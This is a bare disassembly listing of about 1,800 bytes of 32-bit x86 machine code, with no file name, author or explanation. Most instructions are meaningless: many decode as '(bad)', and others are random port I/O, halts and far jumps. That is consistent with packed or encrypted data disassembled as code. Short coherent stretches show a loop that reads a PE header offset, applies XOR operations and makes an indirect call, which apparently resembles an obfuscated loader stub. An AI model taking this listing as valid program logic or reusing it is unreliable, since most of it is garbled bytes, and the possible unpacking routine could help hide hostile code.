  40bd18:	mov    BYTE PTR [esi-0x29a7a345],bl
  40bd1e:	jnp    0x40bcc1
  40bd20:	jbe    0x40bd6e
  40bd22:	xchg   esp,eax
  40bd23:	mov    dh,0xc4
  40bd25:	(bad)  
  40bd26:	ret    0xe45e
  40bd29:	xchg   esi,eax
  40bd2a:	sbb    eax,eax
  40bd2c:	pop    ebx
  40bd2d:	dec    edi
  40bd2e:	sub    ah,BYTE PTR [esp+edx*4]
  40bd31:	sub    dl,bh
  40bd33:	popf   
  40bd34:	pop    ds
  40bd35:	and    al,0xa2
  40bd37:	test   ecx,ebx
  40bd39:	cmp    al,BYTE PTR [ecx+0x24]
  40bd3c:	and    al,0x6b
  40bd3e:	sar    DWORD PTR [eax+0x6c23a3bc],1
  40bd44:	inc    edi
  40bd45:	ficom  WORD PTR [ecx+0x2]
  40bd48:	mov    al,ds:0x27431011
  40bd4d:	add    eax,0x794cb38e
  40bd52:	popf   
  40bd53:	(bad)  cs:[ebp-0x2]
  40bd57:	push   ds
  40bd58:	data16 sti 
  40bd5a:	je     0x40bd54
  40bd5c:	cmc    
  40bd5d:	cld    
  40bd5e:	pop    edx
  40bd5f:	adc    ebp,esp
  40bd61:	ins    DWORD PTR es:[edi],dx
  40bd62:	aad    0x81
  40bd64:	fild   QWORD PTR [ecx+edx*2+0x3662ec59]
  40bd6b:	lods   eax,DWORD PTR ds:[esi]
  40bd6c:	test   eax,0x2eb7618
  40bd71:	(bad)  
  40bd72:	sbb    ecx,DWORD PTR ds:0x4f0f20b2
  40bd78:	sub    eax,0x9186e3af
  40bd7d:	clc    
  40bd7e:	hlt    
  40bd7f:	fsub   DWORD PTR [edi-0x72edb36a]
  40bd85:	ds aam 0xa6
  40bd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd89:	or     esp,DWORD PTR [eax]
  40bd8b:	shr    DWORD PTR [edx-0x57],cl
  40bd8e:	mov    esp,0x31b605eb
  40bd93:	mov    ebx,0x64ded636
  40bd98:	loop   0x40bd9a
  40bd9a:	and    ch,dl
  40bd9c:	sub    BYTE PTR [edx-0x37],bh
  40bd9f:	sbb    al,0x36
  40bda1:	retf   
  40bda2:	fcmovnb st,st(7)
  40bda4:	dec    edx
  40bda5:	lods   eax,DWORD PTR ds:[esi]
  40bda6:	xchg   edi,eax
  40bda7:	jno    0x40bd89
  40bda9:	enter  0xa3a,0xe1
  40bdad:	cmp    cl,BYTE PTR [edi-0xe3ce8b5]
  40bdb3:	push   0xffffff9e
  40bdb5:	addr16 jmp 0xd8d65044
  40bdbb:	push   ss
  40bdbc:	sub    eax,0x8808fa2a
  40bdc1:	dec    esp
  40bdc2:	inc    ecx
  40bdc3:	add    eax,0xd197e70b
  40bdc8:	mov    ebp,0x103390e9
  40bdcd:	inc    ecx
  40bdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdcf:	add    al,0x87
  40bdd1:	sbb    eax,0x53f89d06
  40bdd6:	xor    eax,0x32658e1c
  40bddb:	mov    dl,0x6
  40bddd:	mov    cl,0x62
  40bddf:	mov    esi,0x60082928
  40bde4:	sub    ebp,DWORD PTR [ecx]
  40bde6:	fidivr WORD PTR [edi+0x25]
  40bde9:	push   es
  40bdea:	lods   al,BYTE PTR ds:[esi]
  40bdeb:	cmp    al,0x53
  40bded:	sahf   
  40bdee:	or     DWORD PTR [edi+0x21],ebx
  40bdf1:	and    DWORD PTR [edi+ebp*8-0x3],ebx
  40bdf5:	xor    eax,0xe5a461c7
  40bdfa:	je     0x40bdbc
  40bdfc:	pop    ds
  40bdfd:	or     ebp,eax
  40bdff:	sbb    eax,0x72a0c932
  40be04:	mov    ch,0xec
  40be06:	dec    eax
  40be07:	pop    eax
  40be08:	loope  0x40bdb2
  40be0a:	adc    ebx,esp
  40be0c:	arpl   WORD PTR [edx],si
  40be0e:	int3   
  40be0f:	call   0x333792fe
  40be14:	add    DWORD PTR [edi+ebx*8-0xb],esp
  40be18:	or     ah,BYTE PTR [edx]
  40be1a:	pusha  
  40be1b:	jb     0x40be88
  40be1d:	xchg   edx,eax
  40be1e:	test   BYTE PTR [edx-0x3a],ch
  40be21:	loope  0x40bdbd
  40be23:	rcl    BYTE PTR [edx],cl
  40be25:	addr16 push edi
  40be27:	in     al,0x67
  40be29:	in     al,dx
  40be2a:	dec    ebp
  40be2b:	add    bl,BYTE PTR [eax-0x53]
  40be2e:	sub    al,0x4f
  40be30:	ret    0x4cff
  40be33:	std    
  40be34:	push   0x794c05cb
  40be39:	sbb    ah,BYTE PTR [edx+0x41]
  40be3c:	(bad)  
  40be3d:	push   esp
  40be3e:	inc    edx
  40be3f:	jle    0x40be92
  40be41:	mov    ebp,0xb2c8f69e
  40be46:	sbb    DWORD PTR [ecx+eax*8+0x45],eax
  40be4a:	add    eax,0x3704008a
  40be4f:	and    DWORD PTR ds:0x432dde,0x432700
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432dd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434421
  40be7a:	xor    edx,DWORD PTR ds:0x434419
  40be80:	mov    DWORD PTR ds:0x434421,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434421,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434421
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434421,ecx
  40beb3:	cmp    DWORD PTR ds:0x434421,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432849
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432d1a
  40bed6:	cmp    DWORD PTR ds:0x434421,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     ch,BYTE PTR [esi+edx*4-0x384c8c6]
  40befd:	jo     0x40bf6f
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	lods   eax,DWORD PTR ds:[esi]
  40bf04:	jle    0x40beef
  40bf06:	pop    esp
  40bf07:	jns    0x40beee
  40bf09:	sbb    DWORD PTR [esi],0xffffffbd
  40bf0c:	jle    0x40bf59
  40bf0e:	fsub   DWORD PTR [ebp+0x19]
  40bf11:	inc    esi
  40bf12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf13:	push   ebx
  40bf14:	xchg   ebp,eax
  40bf15:	inc    edx
  40bf16:	jb     0x40bf54
  40bf18:	es sbb bl,0x9e
  40bf1c:	jl     0x40bf83
  40bf1e:	push   ebp
  40bf1f:	xor    al,0xb6
  40bf21:	mov    esp,0xc88cc953
  40bf26:	sbb    al,0x66
  40bf28:	push   ebp
  40bf29:	jns    0x40bf2c
  40bf2b:	fsub   DWORD PTR [edx+0x5e52564f]
  40bf31:	mov    ds:0x7145ccf9,al
  40bf36:	(bad)  
  40bf37:	aaa    
  40bf38:	int3   
  40bf39:	cmp    DWORD PTR fs:[ecx],eax
  40bf3c:	lahf   
  40bf3d:	mov    edx,0xb15d8996
  40bf42:	add    ebp,DWORD PTR [ebx]
  40bf44:	div    DWORD PTR [ecx]
  40bf46:	mov    ds:0xe21ba3df,al
  40bf4b:	xor    ch,al
  40bf4d:	xchg   BYTE PTR [ecx],ch
  40bf4f:	repz cmp ecx,ebx
  40bf52:	iret   
  40bf53:	mov    ecx,0xb2ffff84
  40bf58:	sbb    BYTE PTR [eax-0x724ba9f0],ch
  40bf5e:	dec    ecx
  40bf5f:	and    DWORD PTR [eax-0x3b],ebx
  40bf62:	fisttp DWORD PTR [ebp+ecx*1-0x594a43cd]
  40bf69:	shl    DWORD PTR [edx+0x2a58c295],0xa6
  40bf70:	jl     0x40bfe6
  40bf72:	not    DWORD PTR [esp+ecx*8]
  40bf75:	xor    DWORD PTR [ebx+0x76],esi
  40bf78:	enter  0x110f,0xf1
  40bf7c:	aaa    
  40bf7d:	fist   DWORD PTR [eax+0x69]
  40bf80:	neg    DWORD PTR [esi-0x38d5c668]
  40bf86:	mov    al,ds:0x9a9e4671
  40bf8b:	call   0x56702b11
  40bf90:	imul   esi,DWORD PTR [edi],0x49
  40bf93:	out    dx,eax
  40bf94:	and    eax,0xc4a6be9e
  40bf99:	icebp  
  40bf9a:	dec    ecx
  40bf9b:	inc    edi
  40bf9c:	xor    al,0x2c
  40bf9e:	sub    DWORD PTR [esi-0x1d684559],ecx
  40bfa4:	rcl    bl,1
  40bfa6:	or     DWORD PTR [edx+esi*1+0x59],0xb
  40bfab:	test   DWORD PTR [edi-0x69089fae],esi
  40bfb1:	push   0xffffff89
  40bfb3:	mov    al,ds:0xa1822da5
  40bfb8:	jbe    0x40bf3d
  40bfba:	mov    esp,0x43051441
  40bfbf:	test   cl,ah
  40bfc1:	ss and dl,ch
  40bfc4:	enter  0x5b88,0x5f
  40bfc8:	into   
  40bfc9:	out    0xe9,al
  40bfcb:	dec    BYTE PTR [edx-0x42]
  40bfce:	ins    BYTE PTR es:[edi],dx
  40bfcf:	add    al,BYTE PTR [edi+0x2485982e]
  40bfd5:	sti    
  40bfd6:	cwde   
  40bfd7:	inc    ebx
  40bfd8:	jle    0x40bfc0
  40bfda:	jo     0x40bfce
  40bfdc:	pop    edi
  40bfdd:	mov    ebp,0x30948d9c
  40bfe2:	inc    edi
  40bfe3:	xchg   ebx,eax
  40bfe4:	inc    ebx
  40bfe5:	push   ecx
  40bfe6:	or     al,0x28
  40bfe8:	ins    DWORD PTR es:[edi],dx
  40bfe9:	test   BYTE PTR [edi+eiz*1+0x4f4c0a62],0xd4
  40bff1:	push   ebx
  40bff2:	push   cs
  40bff3:	xchg   edi,eax
  40bff4:	sar    DWORD PTR [ebx-0x2e82b396],0x49
  40bffb:	add    eax,0x1f5d71b1
  40c000:	mov    ebp,0x803971dc
  40c005:	mov    cl,0x76
  40c007:	mov    ebx,0xdcb29faf
  40c00c:	cmp    dl,bh
  40c00e:	data16 out 0xbb,al
  40c011:	xchg   esi,eax
  40c012:	jae    0x40bff4
  40c014:	hlt    
  40c015:	or     BYTE PTR [eax],ch
  40c017:	(bad)  
  40c018:	ds xchg ecx,eax
  40c01a:	imul   edx,DWORD PTR [eax+0x5609c0f6],0x6c
  40c021:	sahf   
  40c022:	jecxz  0x40c064
  40c024:	add    edx,0x8e548393
  40c02a:	stos   DWORD PTR es:[edi],eax
  40c02b:	pop    ecx
  40c02c:	inc    ecx
  40c02d:	jo     0x40c083
  40c02f:	xchg   esi,eax
  40c030:	add    eax,0x5f873a22
  40c035:	pop    es
  40c036:	arpl   WORD PTR [edi-0xced868f],si
  40c03c:	stos   DWORD PTR es:[edi],eax
  40c03d:	fild   DWORD PTR [esi+edi*8]
  40c040:	(bad)  
  40c041:	pop    edx
  40c042:	(bad)  
  40c043:	jo     0x40c05c
  40c045:	xor    DWORD PTR [eax-0x4c],edi
  40c048:	push   ebp
  40c049:	popf   
  40c04a:	mov    cl,0xbe
  40c04c:	retf   
  40c04d:	test   BYTE PTR [ebx-0x3c],cl
  40c050:	arpl   WORD PTR [esi+0x3f],bp
  40c053:	mov    al,BYTE PTR [edx+0x1c68590c]
  40c059:	fld    DWORD PTR [edx]
  40c05b:	sbb    eax,0xe4c3d42a
  40c060:	into   
  40c061:	mov    dl,0xca
  40c063:	mov    al,ds:0x62c1d24c
  40c068:	sahf   
  40c069:	push   0x39
  40c06b:	je     0x40c021
  40c06d:	adc    DWORD PTR [ebx+eax*8],eax
  40c070:	xchg   edx,eax
  40c071:	xchg   DWORD PTR [ebx+0x506869f0],edx
  40c077:	iret   
  40c078:	fcomp  DWORD PTR [ebx-0x5a]
  40c07b:	xor    esi,DWORD PTR [ecx-0x4f]
  40c07e:	out    0x33,al
  40c080:	in     eax,dx
  40c081:	push   cs
  40c082:	fwait
  40c083:	mov    bl,0xa7
  40c085:	xor    eax,0x53df7736
  40c08a:	repnz leave 
  40c08c:	xchg   edx,ebx
  40c08e:	les    ebp,FWORD PTR [edi]
  40c090:	iret   
  40c091:	bound  esp,QWORD PTR [edi]
  40c093:	iret   
  40c094:	sbb    eax,0xbb5f9bba
  40c099:	(bad)  
  40c09a:	es popaw 
  40c09d:	das    
  40c09e:	sti    
  40c09f:	(bad)  
  40c0a0:	xor    eax,0x87b443bf
  40c0a5:	ret    0xb23f
  40c0a8:	clc    
  40c0a9:	push   edx
  40c0aa:	aaa    
  40c0ab:	pop    eax
  40c0ac:	mov    ch,0x97
  40c0ae:	or     edx,edx
  40c0b0:	leave  
  40c0b1:	xor    ch,bl
  40c0b3:	jb     0x40c086
  40c0b5:	mov    eax,0x9fe03c14
  40c0ba:	and    esp,DWORD PTR [eax]
  40c0bc:	xchg   ecx,eax
  40c0bd:	sub    al,0x31
  40c0c0:	cld    
  40c0c1:	xor    BYTE PTR [esi-0x72aaca6f],ch
  40c0c7:	je     0x40c116
  40c0c9:	imul   edi,DWORD PTR [edx-0x17],0xe113cd1d
  40c0d0:	in     eax,0x67
  40c0d2:	pop    eax
  40c0d3:	jb     0x40c075
  40c0d5:	pop    esp
  40c0d6:	fsubr  DWORD PTR [eax-0x777beb52]
  40c0dc:	mov    WORD PTR [ecx+0x58cfa656],gs
  40c0e2:	xchg   esp,eax
  40c0e3:	je     0x40c093
  40c0e5:	arpl   WORD PTR [ecx+0x492333cf],dx
  40c0eb:	inc    esp
  40c0ec:	fdivr  st(0),st
  40c0ee:	cmovno edi,esi
  40c0f1:	pop    es
  40c0f2:	loop   0x40c0a3
  40c0f4:	adc    dh,BYTE PTR [edi+0x4f]
  40c0f7:	test   BYTE PTR [eax-0x220fbbb0],ah
  40c0fd:	fwait
  40c0fe:	in     eax,dx
  40c0ff:	lea    ebp,[edi-0x75]
  40c102:	jne    0x40c10c
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1+0x7ecc53b5],si
  40c11e:	inc    eax
  40c11f:	sti    
  40c120:	jge    0x40c11c
  40c122:	jo     0x40c194
  40c124:	jb     0x40c1a5
  40c126:	jo     0x40c198
  40c128:	push   ebx
  40c129:	popa   
  40c12a:	cdq    
  40c12b:	mov    esp,esi
  40c12d:	jmp    0x1df0:0x535d1529
  40c134:	outs   dx,DWORD PTR ds:[esi]
  40c135:	adc    cl,dh
  40c137:	scas   al,BYTE PTR es:[edi]
  40c138:	into   
  40c139:	adc    eax,0x73c9326e
  40c13e:	ins    DWORD PTR es:[edi],dx
  40c13f:	mov    al,0x21
  40c141:	and    bl,dh
  40c143:	stos   BYTE PTR es:[edi],al
  40c144:	and    dh,ch
  40c146:	jmp    0x1f16:0x66f812b2
  40c14d:	scas   eax,DWORD PTR es:[edi]
  40c14e:	and    bh,BYTE PTR [ecx+0x65]
  40c151:	add    ecx,DWORD PTR [edi+0x5502a7b6]
  40c157:	ins    DWORD PTR es:[edi],dx
  40c158:	repz loopne 0x40c129
  40c15b:	call   0x51034dc6
  40c160:	retf   0x98f8
  40c163:	sbb    bl,BYTE PTR [ebx+0x50]
  40c166:	sbb    ebx,DWORD PTR [esi+edx*4]
  40c169:	retf   
  40c16a:	shl    DWORD PTR [ecx-0x390072f4],0x4a
  40c171:	je     0x40c144
  40c173:	repnz retf 
  40c175:	and    DWORD PTR [edx],0x19a150bb
  40c17b:	push   0xffffffea
  40c17d:	sbb    DWORD PTR [edx+0x3563c819],eax
  40c183:	stc    
  40c184:	(bad)  
  40c185:	or     ebx,DWORD PTR [ecx+0x26]
  40c188:	rcr    BYTE PTR [edx+0x47],cl
  40c18b:	push   0x9bf7214e
  40c190:	adc    bl,dh
  40c192:	pushf  
  40c193:	rcpps  xmm0,xmm2
  40c196:	dec    edi
  40c197:	fs and al,0x8d
  40c19a:	mov    es,WORD PTR [esi]
  40c19c:	js     0x40c21c
  40c19e:	retf   0x35ba
  40c1a1:	lea    esi,[edi-0x2af09eff]
  40c1a7:	pop    edx
  40c1a8:	(bad)  
  40c1a9:	mov    ecx,0x8f0ab748
  40c1ae:	arpl   WORD PTR [ebx],dx
  40c1b0:	sub    al,0x7d
  40c1b2:	call   0x537df914
  40c1b7:	and    BYTE PTR [eax-0x3b],dh
  40c1ba:	shl    BYTE PTR [ecx+0x1b],1
  40c1bd:	mov    esi,0x2b499e51
  40c1c2:	cmp    al,0x8f
  40c1c4:	pop    es
  40c1c5:	cli    
  40c1c6:	mov    WORD PTR [esi],fs
  40c1c8:	push   es
  40c1c9:	je     0x40c22e
  40c1cb:	xor    DWORD PTR [ebx-0x5f],ebp
  40c1ce:	lods   eax,DWORD PTR ds:[esi]
  40c1cf:	mov    ebp,0x8de5d8cb
  40c1d4:	xchg   edi,eax
  40c1d5:	xchg   edx,eax
  40c1d6:	(bad)  
  40c1d7:	cmp    BYTE PTR [edx+0x13bb8bf5],cl
  40c1dd:	push   edx
  40c1de:	dec    esp
  40c1df:	adc    DWORD PTR [ebp-0x94e4191],esp
  40c1e5:	ret    
  40c1e6:	in     eax,dx
  40c1e7:	test   eax,0x99f0b38
  40c1ec:	les    edi,FWORD PTR [ebx+0x70]
  40c1ef:	lods   eax,DWORD PTR gs:[esi]
  40c1f1:	push   cs
  40c1f2:	or     BYTE PTR [eiz*2+0x6153a0b6],bl
  40c1f9:	lock cwde 
  40c1fb:	pop    esi
  40c1fc:	inc    edi
  40c1fd:	sub    BYTE PTR [edi+0x28],ah
  40c200:	push   ebx
  40c201:	leave  
  40c202:	sar    BYTE PTR [esi-0xa1a1f61],1
  40c208:	or     ebp,DWORD PTR [ebx*1+0x48548fc1]
  40c20f:	scas   eax,DWORD PTR es:[edi]
  40c210:	push   esi
  40c211:	add    bh,BYTE PTR [edx+esi*8+0xd]
  40c215:	inc    edi
  40c216:	jp     0x40c1bd
  40c218:	(bad)  
  40c219:	mov    bh,0x89
  40c21b:	enter  0xd4d3,0xc7
  40c21f:	xor    ebp,DWORD PTR ds:0x15bb15ff
  40c225:	ins    BYTE PTR es:[edi],dx
  40c226:	mov    BYTE PTR [eax-0x6f20189b],bl
  40c22c:	enter  0x325d,0x22
  40c230:	sub    eax,0xe9f0caa5
  40c235:	mov    ch,0xb1
  40c237:	ds dec edx
  40c239:	test   eax,0x9d0399f7
  40c23e:	push   edi
  40c23f:	cdq    
  40c240:	call   0x1bcb:0x94b3336d
  40c247:	retf   0x8a22
  40c24a:	push   eax
  40c24b:	scas   al,BYTE PTR es:[edi]
  40c24c:	test   al,0x5d
  40c24e:	mov    bh,0x53
  40c250:	inc    edx
  40c251:	jo     0x40c25c
  40c253:	test   BYTE PTR [edx-0x3ef433],0xdf
  40c25a:	dec    edi
  40c25b:	rcr    BYTE PTR [ecx-0x5a7f0036],1
  40c261:	ja     0x40c1f6
  40c263:	imul   DWORD PTR fs:[esi]
  40c266:	ins    BYTE PTR es:[edi],dx
  40c267:	nop
  40c268:	jmp    0xea3afdf3
  40c26d:	jmp    0xce61:0x91f2291f
  40c274:	pop    ds
  40c275:	xchg   eax,ebx
  40c277:	cdq    
  40c278:	or     esi,edi
  40c27a:	inc    ebx
  40c27b:	je     0x40c29a
  40c27d:	es or  esi,esp
  40c280:	cmp    esp,DWORD PTR [ebp-0x2f8f8a63]
  40c286:	cmp    ecx,DWORD PTR [edi]
  40c288:	sbb    BYTE PTR [eax-0x3c823357],ah
  40c28e:	lods   eax,DWORD PTR ds:[esi]
  40c28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c290:	ins    BYTE PTR es:[edi],dx
  40c291:	div    BYTE PTR [esi-0x60]
  40c294:	out    dx,al
  40c295:	inc    eax
  40c296:	ins    BYTE PTR es:[edi],dx
  40c297:	lds    ecx,FWORD PTR [ecx]
  40c299:	push   0xffffffdb
  40c29b:	out    0x1d,eax
  40c29d:	and    BYTE PTR [edi+0x66],al
  40c2a0:	dec    esp
  40c2a1:	sbb    DWORD PTR [ebx+0x22],edx
  40c2a4:	ror    BYTE PTR [ebx+0x5323879],0x34
  40c2ab:	sbb    ecx,ebx
  40c2ad:	mov    BYTE PTR [esi+0x28],ah
  40c2b0:	pop    ebp
  40c2b1:	aaa    
  40c2b2:	pop    ecx
  40c2b3:	int3   
  40c2b4:	xchg   ebx,eax
  40c2b5:	xor    al,0xe6
  40c2b7:	mov    ch,0x79
  40c2b9:	inc    DWORD PTR [edx-0x703907be]
  40c2bf:	jno    0x40c327
  40c2c1:	shl    DWORD PTR [eax+0x73e69763],1
  40c2c7:	jmp    DWORD PTR [edi+0x5e]
  40c2ca:	call   DWORD PTR [ebp+0x12]
  40c2cd:	push   eax
  40c2ce:	xchg   ebx,eax
  40c2cf:	add    BYTE PTR ds:0xa956cda0,ch
  40c2d5:	push   edi
  40c2d6:	sbb    esp,eax
  40c2d8:	iret   
  40c2d9:	jno    0x40c2e5
  40c2db:	add    al,0xfb
  40c2dd:	sbb    cl,0x42
  40c2e0:	xchg   ebp,eax
  40c2e1:	pop    ecx
  40c2e2:	or     eax,0x50e91dd1
  40c2e7:	(bad)
  40c2ea:	cmp    al,0x39
  40c2ec:	lea    edx,[ecx-0x5c]
  40c2ef:	add    eax,DWORD PTR [eax]
  40c2f1:	ds out dx,eax
  40c2f3:	pop    es
  40c2f4:	aaa    
  40c2f5:	jnp    0x40c2ab
  40c2f7:	scas   al,BYTE PTR es:[edi]
  40c2f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f9:	cmp    eax,0x333d7f3
  40c2fe:	pop    ds
  40c2ff:	mov    edx,DWORD PTR [ecx]
  40c301:	popf   
  40c302:	fisttp DWORD PTR [ebx]
  40c304:	push   ds
  40c305:	xchg   edx,eax
  40c306:	jecxz  0x40c351
  40c308:	loopne 0x40c34d
  40c30a:	jge    0x40c2e9
  40c30c:	xchg   DWORD PTR [edi],ecx
  40c30e:	mov    ebx,DWORD PTR [ebx+0x7dee0bf7]
  40c314:	out    dx,eax
  40c315:	add    DWORD PTR [esi+0x30],ecx
  40c318:	in     al,dx
  40c319:	lahf   
  40c31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c31b:	(bad)  
  40c31d:	push   esi
  40c31e:	jns    0x40c34d
  40c320:	cmp    esp,ebp
  40c322:	jg     0x40c2e2
  40c324:	pushf  
  40c325:	push   edx
  40c326:	cmp    DWORD PTR [esi+0x54],eax
  40c329:	pop    esi
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c365
  40c359:	xchg   edi,eax
  40c35a:	mov    ds:0x70f87f29,eax
  40c35f:	jo     0x40c3d3
  40c361:	jg     0x40c3d3
  40c363:	jo     0x40c3b1
  40c365:	addr16 repnz dec eax
  40c368:	outs   dx,BYTE PTR ds:[esi]
  40c369:	add    esp,eax
  40c36b:	sub    bh,BYTE PTR [ecx-0x56d4a761]
  40c371:	mov    es,esp
  40c373:	jg     0x40c309
  40c375:	sub    WORD PTR [bx+di+0x4],si
  40c37a:	cmp    ecx,edi
  40c37c:	adc    eax,DWORD PTR [ebx+0x37966a6f]
  40c382:	inc    BYTE PTR [ebx]
  40c384:	adc    eax,DWORD PTR [ecx-0x6ab7bc57]
  40c38a:	lea    eax,[eax-0x1a]
  40c38d:	mov    ds:0xf73d77d5,eax
  40c392:	outs   dx,BYTE PTR ds:[esi]
  40c393:	out    0x87,al
  40c395:	jno    0x40c35c
  40c397:	pop    esp
  40c398:	in     eax,0xcc
  40c39a:	fld    st(2)
  40c39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c39d:	mov    ecx,0xcd8315f3
  40c3a2:	jecxz  0x40c3fc
  40c3a4:	inc    esp
  40c3a5:	inc    eax
  40c3a6:	fwait
  40c3a7:	cmp    eax,0xc0b8c99
  40c3ac:	xor    eax,0x781f18ff
  40c3b1:	fidivr DWORD PTR [ebx]
  40c3b3:	add    al,0xb6
  40c3b5:	scas   al,BYTE PTR es:[edi]
  40c3b6:	(bad)  
  40c3b7:	out    0xaa,eax
  40c3b9:	inc    esp
  40c3ba:	add    edi,ebx
  40c3bc:	int3   
  40c3bd:	adc    al,bl
  40c3bf:	inc    esi
  40c3c0:	imul   ecx,DWORD PTR [esi+0x2572ffb5],0x18fdcd6e
  40c3ca:	rol    DWORD PTR [edi+edx*1],1
  40c3cd:	mov    dl,0x4d
  40c3cf:	pop    edx
  40c3d0:	dec    esp
  40c3d1:	add    eax,0xfb0ae3a
  40c3d6:	aad    0x76
  40c3d8:	jmp    0xd448:0xc0351694
  40c3df:	aam    0x6d
  40c3e1:	enter  0x8fc9,0xd6
  40c3e5:	mov    bl,0x2c
  40c3e7:	sar    esp,cl
  40c3e9:	and    esp,ebx
  40c3eb:	xchg   esi,eax
  40c3ed:	cmc    
  40c3ee:	pusha  
  40c3ef:	cmp    ah,0xcc
  40c3f2:	pop    eax
  40c3f3:	adc    DWORD PTR [edx+0x7a2be476],edx
  40c3f9:	xor    DWORD PTR [esi-0x3b826106],edi
  40c3ff:	and    eax,0x824dc8b4
  40c404:	mov    bl,0x84
  40c406:	jle    0x40c3ae
  40c408:	inc    esp
  40c409:	cmp    eax,DWORD PTR [ebp+0x13]
  40c40c:	cdq    
  40c40d:	lock sbb cl,BYTE PTR gs:[esi+0x6f]
  40c412:	mov    esp,0x7494026
  40c417:	test   al,0xed
  40c419:	mov    ds:0xd598d8fe,al
  40c41e:	pop    ds
  40c41f:	xor    ebp,DWORD PTR [edi-0x5d]
  40c422:	in     al,dx
  40c423:	retf   
  40c424:	push   ebx
  40c425:	es jmp 0x303a91a
  40c42b:	and    DWORD PTR [ebp-0xff17bd8],esp
  40c431:	in     eax,0xf2
  40c433:	and    edx,ecx
  40c435:	sti    
  40c436:	xor    BYTE PTR [edx-0x63],ah
  40c439:	stos   DWORD PTR es:[edi],eax
  40c43a:	xor    esi,DWORD PTR [edx]
  40c43c:	adc    eax,0x14e7f8bf
  40c441:	inc    ebx
  40c442:	dec    esi
  40c443:	out    dx,eax
  40c444:	push   ds
  40c445:	das    
  40c446:	(bad)  
  40c447:	sbb    eax,0x35ea2c5b
  40c44c:	mov    DWORD PTR [ebp*1+0x6ea11654],esi
  40c453:	cld    
  40c454:	scas   eax,DWORD PTR es:[edi]
  40c455:	push   ecx
  40c456:	pop    ss
  40c457:	push   0xffffffd2
  40c459:	sbb    cl,cl
  40c45b:	cdq    
  40c45c:	inc    eax
  40c45d:	push   edi
  40c45e:	mov    ebp,0xc2b58222
  40c463:	jl     0x40c459
  40c465:	pushf  
  40c466:	mov    eax,0x7b69666d
  40c46b:	rol    esp,1
  40c46d:	jo     0x40c48b
  40c46f:	je     0x40c41c
  40c471:	sbb    BYTE PTR [ebx-0x11562100],bl
  40c477:	lods   al,BYTE PTR ds:[esi]
  40c478:	cs lock push 0xd
  40c47c:	call   DWORD PTR [ecx]
  40c47e:	cmp    bh,0xe6
  40c481:	dec    edi
  40c482:	mov    al,0xa0
  40c484:	inc    ecx
  40c485:	sbb    al,cl
  40c487:	into   
  40c488:	jmp    0x40c4ce
  40c48a:	sub    BYTE PTR [ebx+esi*1],0xb7
  40c48e:	and    DWORD PTR [eax-0x41b47df5],edi
  40c494:	sbb    DWORD PTR [eax-0x6ac72a4f],0xffffff83
  40c49b:	rol    ecx,1
  40c49d:	jne    0x40c4ac
  40c49f:	out    dx,al
  40c4a0:	jo     0x40c4cd
  40c4a2:	sbb    BYTE PTR [edx+0x70],0xfe
  40c4a6:	or     BYTE PTR [ecx+0x6a57f19d],cl
  40c4ac:	xor    al,0xdb
  40c4ae:	and    esi,DWORD PTR [eax+0x0]
  40c4b1:	xchg   BYTE PTR [esi+eax*2-0x7],bh
  40c4b5:	xchg   edx,eax
  40c4b6:	sub    BYTE PTR [ecx-0xb],0xc3
  40c4ba:	ins    DWORD PTR es:[edi],dx
  40c4bb:	jnp    0x40c49b
  40c4bd:	mov    ecx,0x2b66a47
  40c4c2:	(bad)  
  40c4c4:	out    dx,eax
  40c4c5:	cld    
  40c4c6:	fisubr WORD PTR [edi-0x74]
  40c4c9:	(bad)  
  40c4ca:	or     DWORD PTR [ebx+0x2f83d946],eax
  40c4d0:	and    DWORD PTR [ecx],edi
  40c4d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4d3:	inc    ebp
  40c4d4:	popf   
  40c4d5:	sbb    DWORD PTR [eax],esp
  40c4d7:	aas    
  40c4d8:	loop   0x40c522
  40c4da:	bound  esi,QWORD PTR [eax+0x2]
